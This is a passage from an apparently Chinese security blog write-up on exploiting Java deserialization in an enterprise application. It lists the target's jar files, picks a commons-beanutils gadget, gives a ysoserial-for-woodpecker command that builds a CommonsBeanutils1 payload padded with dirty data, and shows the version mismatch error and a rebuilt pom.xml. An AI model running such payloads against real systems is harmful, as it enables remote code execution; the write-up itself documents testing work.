+jsr181<span class="token operator">-</span>api<span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">.</span>jar
+jsr250<span class="token operator">-</span>api<span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">.</span>jar
+junit<span class="token operator">-</span><span class="token number">4.10</span><span class="token punctuation">.</span>jar
+jxl<span class="token punctuation">.</span>jar
+jxls<span class="token operator">-</span>core<span class="token operator">-</span><span class="token number">0.9</span><span class="token number">.6</span><span class="token punctuation">.</span>jar
+log4j<span class="token operator">-</span><span class="token number">1.2</span><span class="token number">.8</span><span class="token punctuation">.</span>jar
+log4j<span class="token operator">-</span>over<span class="token operator">-</span>slf4j<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.6</span><span class="token punctuation">.</span>jar
+mail<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jar
+mail<span class="token punctuation">.</span>jar
+mex<span class="token operator">-</span>impl<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jar
+mondrian<span class="token operator">-</span><span class="token number">3.3</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+mx4j<span class="token operator">-</span>tools<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.2</span><span class="token punctuation">.</span>jar
+neethi<span class="token operator">-</span><span class="token number">2.0</span><span class="token number">.2</span><span class="token punctuation">.</span>jar
+nekohtml<span class="token operator">-</span><span class="token number">1.9</span><span class="token number">.7</span><span class="token punctuation">.</span>jar
+numformat<span class="token punctuation">.</span>jar
+ognl<span class="token operator">-</span><span class="token number">2.6</span><span class="token number">.9</span><span class="token punctuation">.</span>jar
+olap4j<span class="token operator">-</span><span class="token number">1.0</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+olap4jcli<span class="token punctuation">.</span>jar
+org<span class="token punctuation">.</span>eclipse<span class="token punctuation">.</span>emf<span class="token punctuation">.</span>common<span class="token operator">-</span><span class="token number">2.2</span><span class="token number">.1</span><span class="token punctuation">.</span>jar
+org<span class="token punctuation">.</span>eclipse<span class="token punctuation">.</span>emf<span class="token punctuation">.</span>ecore<span class="token operator">-</span><span class="token number">2.2</span><span class="token number">.1</span><span class="token punctuation">.</span>jar
+org<span class="token punctuation">.</span>eclipse<span class="token punctuation">.</span>emf<span class="token punctuation">.</span>ecore<span class="token punctuation">.</span>xmi<span class="token operator">-</span><span class="token number">2.2</span><span class="token number">.1</span><span class="token punctuation">.</span>jar
+org<span class="token punctuation">.</span>eclipse<span class="token punctuation">.</span>xsd<span class="token operator">-</span><span class="token number">2.2</span><span class="token number">.1</span><span class="token punctuation">.</span>jar
+org<span class="token punctuation">.</span>gocom<span class="token punctuation">.</span>bps<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bizform<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.1</span><span class="token punctuation">.</span>jar
+org<span class="token punctuation">.</span>gocom<span class="token punctuation">.</span>bps<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bizform<span class="token punctuation">.</span>components<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.1</span><span class="token punctuation">.</span>jar
+org<span class="token punctuation">.</span>gocom<span class="token punctuation">.</span>components<span class="token punctuation">.</span>bpff<span class="token punctuation">.</span>control<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.1</span><span class="token punctuation">.</span>jar
+org<span class="token punctuation">.</span>gocom<span class="token punctuation">.</span>components<span class="token punctuation">.</span>taskcenter<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.6</span><span class="token punctuation">.</span>jar
+pdf<span class="token operator">-</span>transcoder<span class="token punctuation">.</span>jar
+poi<span class="token operator">-</span><span class="token number">3.16</span><span class="token punctuation">.</span>jar
+poi<span class="token operator">-</span>excelant<span class="token operator">-</span><span class="token number">3.16</span><span class="token punctuation">.</span>jar
+poi<span class="token operator">-</span>ooxml<span class="token operator">-</span><span class="token number">3.16</span><span class="token punctuation">.</span>jar
+poi<span class="token operator">-</span>ooxml<span class="token operator">-</span>schemas<span class="token operator">-</span><span class="token number">3.16</span><span class="token punctuation">.</span>jar
+poi<span class="token operator">-</span>scratchpad<span class="token operator">-</span><span class="token number">3.16</span><span class="token punctuation">.</span>jar
+poi2<span class="token punctuation">.</span>jar
+ptp<span class="token operator">-</span>server<span class="token operator">-</span>commons<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+ptp<span class="token operator">-</span>server<span class="token operator">-</span>das<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+ptp<span class="token operator">-</span>server<span class="token operator">-</span>data<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+ptp<span class="token operator">-</span>server<span class="token operator">-</span>datacontext<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+ptp<span class="token operator">-</span>server<span class="token operator">-</span>deploy<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+ptp<span class="token operator">-</span>server<span class="token operator">-</span>engine<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+ptp<span class="token operator">-</span>server<span class="token operator">-</span>jdbc<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+ptp<span class="token operator">-</span>server<span class="token operator">-</span>l7e<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+ptp<span class="token operator">-</span>server<span class="token operator">-</span>runtime<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+ptp<span class="token operator">-</span>server<span class="token operator">-</span>scriptengine<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+ptp<span class="token operator">-</span>server<span class="token operator">-</span>spring<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+ptp<span class="token operator">-</span>server<span class="token operator">-</span>spring4das<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+ptp<span class="token operator">-</span>server<span class="token operator">-</span>statistic<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+ptp<span class="token operator">-</span>server<span class="token operator">-</span>wsclient<span class="token operator">-</span><span class="token number">5.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+<span class="token class-name">Qrcode_swetake</span><span class="token punctuation">.</span>jar
+quartz<span class="token operator">-</span><span class="token number">1.5</span><span class="token number">.2</span><span class="token punctuation">.</span>jar
+rampart<span class="token operator">-</span>core<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jar
+rampart<span class="token operator">-</span>policy<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jar
+rampart<span class="token operator">-</span>trust<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jar
+raqsoftReport<span class="token punctuation">.</span>jar
+rediscli<span class="token punctuation">.</span>jar
+report4<span class="token punctuation">.</span>jar
+report5StaticHtml<span class="token punctuation">.</span>jar
+resteasy<span class="token operator">-</span>client<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.1</span><span class="token punctuation">.</span>jar
+resteasy<span class="token operator">-</span>jackson<span class="token operator">-</span>provider<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.1</span><span class="token punctuation">.</span>jar
+resteasy<span class="token operator">-</span>jaxrs<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.1</span><span class="token punctuation">.</span>jar
+resteasy<span class="token operator">-</span>multipart<span class="token operator">-</span>provider<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.1</span><span class="token punctuation">.</span>jar
+sac<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jar
+sapcli<span class="token punctuation">.</span>jar
+sca<span class="token operator">-</span>api<span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">.</span>jar
+sdo<span class="token operator">-</span>api<span class="token operator">-</span><span class="token number">2.1</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+slf4j<span class="token operator">-</span>api<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.6</span><span class="token punctuation">.</span>jar
+snmp4j<span class="token operator">-</span><span class="token number">2.3</span><span class="token number">.1</span><span class="token punctuation">.</span>jar
+soap<span class="token operator">-</span>api<span class="token operator">-</span><span class="token number">1.3</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+sparkcli<span class="token punctuation">.</span>jar
+spring<span class="token operator">-</span>aop<span class="token operator">-</span><span class="token number">3.2</span><span class="token number">.17</span><span class="token punctuation">.</span>RELEASE<span class="token punctuation">.</span>jar
+spring<span class="token operator">-</span>beans<span class="token operator">-</span><span class="token number">3.2</span><span class="token number">.17</span><span class="token punctuation">.</span>RELEASE<span class="token punctuation">.</span>jar
+spring<span class="token operator">-</span>context<span class="token operator">-</span><span class="token number">3.2</span><span class="token number">.17</span><span class="token punctuation">.</span>RELEASE<span class="token punctuation">.</span>jar
+spring<span class="token operator">-</span>core<span class="token operator">-</span><span class="token number">3.2</span><span class="token number">.17</span><span class="token punctuation">.</span>RELEASE<span class="token punctuation">.</span>jar
+spring<span class="token operator">-</span>expression<span class="token operator">-</span><span class="token number">3.2</span><span class="token number">.17</span><span class="token punctuation">.</span>RELEASE<span class="token punctuation">.</span>jar
+spring<span class="token operator">-</span>jdbc<span class="token operator">-</span><span class="token number">3.2</span><span class="token number">.17</span><span class="token punctuation">.</span>RELEASE<span class="token punctuation">.</span>jar
+spring<span class="token operator">-</span>jms<span class="token operator">-</span><span class="token number">3.2</span><span class="token number">.17</span><span class="token punctuation">.</span>RELEASE<span class="token punctuation">.</span>jar
+spring<span class="token operator">-</span>tx<span class="token operator">-</span><span class="token number">3.2</span><span class="token number">.17</span><span class="token punctuation">.</span>RELEASE<span class="token punctuation">.</span>jar
+sso<span class="token operator">-</span>client<span class="token operator">-</span>java<span class="token operator">-</span><span class="token number">7.0</span><span class="token number">.2</span><span class="token punctuation">.</span>jar
+sso<span class="token operator">-</span>proxy<span class="token operator">-</span><span class="token number">7.0</span><span class="token number">.2</span><span class="token punctuation">.</span>jar
+stax<span class="token operator">-</span>api<span class="token operator">-</span><span class="token number">1.0</span><span class="token number">.1</span><span class="token punctuation">.</span>jar
+substance<span class="token operator">-</span><span class="token number">7.2</span><span class="token number">.1</span><span class="token punctuation">.</span>jar
+webservicecli<span class="token punctuation">.</span>jar
+webutil<span class="token punctuation">.</span>jar
+wsdl4j<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.2</span><span class="token punctuation">.</span>jar
+wss4j<span class="token operator">-</span><span class="token number">1.5</span><span class="token number">.3</span><span class="token punctuation">.</span>jar
+xalan<span class="token operator">-</span><span class="token number">2.5</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+xalan<span class="token operator">-</span><span class="token number">2.6</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+xercesImpl<span class="token operator">-</span><span class="token number">2.8</span><span class="token number">.1</span><span class="token punctuation">.</span>jar
+xercesImpl<span class="token punctuation">.</span>jar
+xml<span class="token operator">-</span>apis<span class="token operator">-</span><span class="token number">1.2</span><span class="token number">.01</span><span class="token punctuation">.</span>jar
+xml<span class="token operator">-</span>apis<span class="token operator">-</span>ext<span class="token punctuation">.</span>jar
+xml<span class="token operator">-</span>apis<span class="token punctuation">.</span>jar
+xmlbeans<span class="token operator">-</span><span class="token number">2.3</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+xmlbeans<span class="token operator">-</span><span class="token number">2.6</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+<span class="token class-name">XmlSchema</span><span class="token operator">-</span><span class="token number">1.3</span><span class="token number">.2</span><span class="token punctuation">.</span>jar
+xmlsec<span class="token operator">-</span><span class="token number">1.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+xmlworker<span class="token operator">-</span><span class="token number">5.5</span><span class="token number">.6</span><span class="token punctuation">.</span>jar
+xstream<span class="token operator">-</span><span class="token number">1.2</span><span class="token number">.2</span><span class="token punctuation">.</span>jar
+zxing_core<span class="token punctuation">.</span>jar
+</code></pre>
+<p>从上面的jar包我们知道 commons-collections  commons-beanutils 在加上之前的我们可以猜出。使用的应该是org.apache.commons.beanutils.BeanComparator  commons-beanutils 。所以我们就有目标了直接使用commons-beanutils  进行构造。</p>
+<p>java -jar ysoserial-for-woodpecker-0.5.2.jar -g CommonsBeanutils1 -a raw_cmd:”ping xxxx”  –dirt-data-length 400000 &gt;curl4.cer</p>
+<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404291724134.png" alt="打失败了"><br>看一下回显我去没有难倒是不出网没漏洞不可能<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404291753731.png" alt="看回显"><br>我们这个时候要看一个关键报错点 serialVersionUID 这个是反序列化的时候必须要带的点。那我们可以推断出来是不是 目标版本和我们工具的版本不一样导致的这种问题。</p>
+<pre class="language-java" data-language="java"><code class="language-java">serialVersionUID <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2044202215314119608</span><span class="token punctuation">,</span> local <span class="token keyword">class</span> serialVersionUID <span class="token operator">=</span> <span class="token number">2573799559215537819</span>u</code></pre>
+<p>转变思路我们使用maven重新编译一下 下载源代码<br><a target="_blank" rel="noopener" href="https://github.com/woodpecker-framework/ysoserial-for-woodpecker">https://github.com/woodpecker-framework/ysoserial-for-woodpecker</a></p>
+<p>使用mvn编译报错如下:</p>
+<pre class="language-java" data-language="java"><code class="language-java"><span class="token punctuation">[</span>ERROR<span class="token punctuation">]</span> <span class="token class-name">Unknown</span> lifecycle phase <span class="token string">"mvn"</span><span class="token punctuation">.</span> <span class="token class-name">You</span> must specify a valid lifecycle phase or a goal in the format <span class="token operator">&lt;</span>plugin<span class="token operator">-</span>prefix<span class="token operator">></span><span class="token operator">:</span><span class="token generics"><span class="token punctuation">&lt;</span>goal<span class="token punctuation">></span></span> or <span class="token operator">&lt;</span>plugin<span class="token operator">-</span>group<span class="token operator">-</span>id<span class="token operator">></span><span class="token operator">:</span><span class="token operator">&lt;</span>plugin<span class="token operator">-</span>artifact<span class="token operator">-</span>id<span class="token operator">></span><span class="token punctuation">[</span><span class="token operator">:</span><span class="token operator">&lt;</span>plugin<span class="token operator">-</span>version<span class="token operator">></span><span class="token punctuation">]</span><span class="token operator">:</span><span class="token generics"><span class="token punctuation">&lt;</span>goal<span class="token punctuation">></span></span><span class="token punctuation">.</span> <span class="token class-name">Available</span> lifecycle phases are<span class="token operator">:</span> validate<span class="token punctuation">,</span> initialize<span class="token punctuation">,</span> generate<span class="token operator">-</span>sources<span class="token punctuation">,</span> process<span class="token operator">-</span>sources<span class="token punctuation">,</span> generate<span class="token operator">-</span>resources<span class="token punctuation">,</span> process<span class="token operator">-</span>resources<span class="token punctuation">,</span> compile<span class="token punctuation">,</span> process<span class="token operator">-</span>classes<span class="token punctuation">,</span> generate<span class="token operator">-</span>test<span class="token operator">-</span>sources<span class="token punctuation">,</span> process<span class="token operator">-</span>test<span class="token operator">-</span>sources<span class="token punctuation">,</span> generate<span class="token operator">-</span>test<span class="token operator">-</span>resources<span class="token punctuation">,</span> process<span class="token operator">-</span>test<span class="token operator">-</span>resources<span class="token punctuation">,</span> test<span class="token operator">-</span>compile<span class="token punctuation">,</span> process<span class="token operator">-</span>test<span class="token operator">-</span>classes<span class="token punctuation">,</span> test<span class="token punctuation">,</span> prepare<span class="token operator">-</span><span class="token keyword">package</span><span class="token punctuation">,</span> <span class="token keyword">package</span><span class="token punctuation">,</span> pre<span class="token operator">-</span>integration<span class="token operator">-</span>test<span class="token punctuation">,</span> integration<span class="token operator">-</span>test<span class="token punctuation">,</span> post<span class="token operator">-</span>integration<span class="token operator">-</span>test<span class="token punctuation">,</span> verify<span class="token punctuation">,</span> install<span class="token punctuation">,</span> deploy<span class="token punctuation">,</span> pre<span class="token operator">-</span>clean<span class="token punctuation">,</span> clean<span class="token punctuation">,</span> post<span class="token operator">-</span>clean<span class="token punctuation">,</span> pre<span class="token operator">-</span>site<span class="token punctuation">,</span> site<span class="token punctuation">,</span> post<span class="token operator">-</span>site<span class="token punctuation">,</span> site<span class="token operator">-</span>deploy<span class="token punctuation">.</span> <span class="token operator">-></span> <span class="token punctuation">[</span><span class="token class-name">Help</span> <span class="token number">1</span><span class="token punctuation">]</span>
+<span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>maven<span class="token punctuation">.</span>lifecycle<span class="token punctuation">.</span></span>LifecyclePhaseNotFoundException</span><span class="token operator">:</span> <span class="token class-name">Unknown</span> lifecycle phase <span class="token string">"mvn"</span><span class="token punctuation">.</span> <span class="token class-name">You</span> must specify a valid lifecycle phase or a goal in the format <span class="token operator">&lt;</span>plugin<span class="token operator">-</span>prefix<span class="token operator">></span><span class="token operator">:</span><span class="token generics"><span class="token punctuation">&lt;</span>goal<span class="token punctuation">></span></span> or <span class="token operator">&lt;</span>plugin<span class="token operator">-</span>group<span class="token operator">-</span>id<span class="token operator">></span><span class="token operator">:</span><span class="token operator">&lt;</span>plugin<span class="token operator">-</span>artifact<span class="token operator">-</span>id<span class="token operator">></span><span class="token punctuation">[</span><span class="token operator">:</span><span class="token operator">&lt;</span>plugin<span class="token operator">-</span>version<span class="token operator">></span><span class="token punctuation">]</span><span class="token operator">:</span><span class="token generics"><span class="token punctuation">&lt;</span>goal<span class="token punctuation">></span></span><span class="token punctuation">.</span> <span class="token class-name">Available</span> lifecycle phases are<span class="token operator">:</span> validate<span class="token punctuation">,</span> initialize<span class="token punctuation">,</span> generate<span class="token operator">-</span>sources<span class="token punctuation">,</span> process<span class="token operator">-</span>sources<span class="token punctuation">,</span> generate<span class="token operator">-</span>resources<span class="token punctuation">,</span> process<span class="token operator">-</span>resources<span class="token punctuation">,</span> compile<span class="token punctuation">,</span> process<span class="token operator">-</span>classes<span class="token punctuation">,</span> generate<span class="token operator">-</span>test<span class="token operator">-</span>sources<span class="token punctuation">,</span> process<span class="token operator">-</span>test<span class="token operator">-</span>sources<span class="token punctuation">,</span> generate<span class="token operator">-</span>test<span class="token operator">-</span>resources<span class="token punctuation">,</span> process<span class="token operator">-</span>test<span class="token operator">-</span>resources<span class="token punctuation">,</span> test<span class="token operator">-</span>compile<span class="token punctuation">,</span> process<span class="token operator">-</span>test<span class="token operator">-</span>classes<span class="token punctuation">,</span> test<span class="token punctuation">,</span> prepare<span class="token operator">-</span><span class="token keyword">package</span><span class="token punctuation">,</span> <span class="token keyword">package</span><span class="token punctuation">,</span> pre<span class="token operator">-</span>integration<span class="token operator">-</span>test<span class="token punctuation">,</span> integration<span class="token operator">-</span>test<span class="token punctuation">,</span> post<span class="token operator">-</span>integration<span class="token operator">-</span>test<span class="token punctuation">,</span> verify<span class="token punctuation">,</span> install<span class="token punctuation">,</span> deploy<span class="token punctuation">,</span> pre<span class="token operator">-</span>clean<span class="token punctuation">,</span> clean<span class="token punctuation">,</span> post<span class="token operator">-</span>clean<span class="token punctuation">,</span> pre<span class="token operator">-</span>site<span class="token punctuation">,</span> site<span class="token punctuation">,</span> post<span class="token operator">-</span>site<span class="token punctuation">,</span> site<span class="token operator">-</span>deploy<span class="token punctuation">.</span></code></pre>
+<p>我们修改一下pom.xml文件</p>
+<pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>defaultGoal</span><span class="token punctuation">></span></span>compile<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>defaultGoal</span><span class="token punctuation">></span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">></span></span>
+		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">></span></span>
+			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.maven.plugins<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
+			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>maven-compiler-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
+			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.5.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
+			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>
+				<span class="token comment">&lt;!-- maximize compatibility --></span>
+				<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span><span class="token punctuation">></span></span>1.5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>source</span><span class="token punctuation">></span></span>
+				<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>target</span><span class="token punctuation">></span></span>1.5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>target</span><span class="token punctuation">></span></span>
+				<span class="token comment">&lt;!-- ignore noisy internal api warnings --></span>
+                   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>compilerArgument</span><span class="token punctuation">></span></span>-XDignore.symbol.file<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>compilerArgument</span><span class="token punctuation">></span></span>
+                   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>fork</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>fork</span><span class="token punctuation">></span></span>
+               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span>
+		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">></span></span>
+		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">></span></span>
+			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>maven-assembly-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
+			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>
+				<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>finalName</span><span class="token punctuation">></span></span>$&#123;project.artifactId&#125;-$&#123;project.version&#125;-all<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>finalName</span><span class="token punctuation">></span></span>
+				<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appendAssemblyId</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>appendAssemblyId</span><span class="token punctuation">></span></span>
+				<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>archive</span><span class="token punctuation">></span></span>
+					<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>manifest</span><span class="token punctuation">></span></span>
+						<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mainClass</span><span class="token punctuation">></span></span>me.gv7.woodpecker.yso.GeneratePayload<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mainClass</span><span class="token punctuation">></span></span>
+					<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>manifest</span><span class="token punctuation">></span></span>
+				<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>archive</span><span class="token punctuation">></span></span>
+                   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>descriptor</span><span class="token punctuation">></span></span>assembly.xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>descriptor</span><span class="token punctuation">></span></span>
+               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span>
+			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>executions</span><span class="token punctuation">></span></span>
+				<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>execution</span><span class="token punctuation">></span></span>
+					<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>make-assembly<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
+					<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>phase</span><span class="token punctuation">></span></span>package<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>phase</span><span class="token punctuation">></span></span>
+					<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>goals</span><span class="token punctuation">></span></span>
+						<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>goal</span><span class="token punctuation">></span></span>assembly<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>goal</span><span class="token punctuation">></span></span>
+					<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>goals</span><span class="token punctuation">></span></span>
+				<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>execution</span><span class="token punctuation">></span></span>
+			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>executions</span><span class="token punctuation">></span></span>
+		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">></span></span>
+		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">></span></span>
+	        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.maven.plugins<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
+	        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>maven-surefire-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
+               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.0.0-M1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
+	        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>
+		        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>trimStackTrace</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>trimStackTrace</span><span class="token punctuation">></span></span>
+		        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>systemPropertyVariables</span><span class="token punctuation">></span></span>
+		        	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java.rmi.server.useCodebaseOnly</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java.rmi.server.useCodebaseOnly</span><span class="token punctuation">></span></span>
+		        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>systemPropertyVariables</span><span class="token punctuation">></span></span>
+	        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span>
+	    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">></span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">></span></span>
+	
+	
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">></span></span></code></pre>
+
